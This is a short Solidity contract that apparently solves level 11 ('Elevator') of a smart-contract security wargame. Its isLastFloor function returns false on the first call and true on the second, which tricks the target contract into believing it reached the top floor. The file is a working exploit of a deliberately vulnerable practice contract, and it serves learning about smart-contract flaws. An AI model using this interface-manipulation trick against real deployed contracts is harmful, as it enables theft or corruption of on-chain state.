// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "src/level11.sol";

contract BrokenElevator
{
    Elevator level11;
    bool public counter = false;

    constructor(address _level11) public
    {
        level11 = Elevator(_level11);
    }

    function isLastFloor(uint256) external returns (bool)
    {
        if(!counter)
        {
            counter = true;
            return false;
        }
        else 
        {
            counter = false;
            return true;
        }
    }

    function gotoFloor() public
    {
        level11.goTo(1);       
    }
}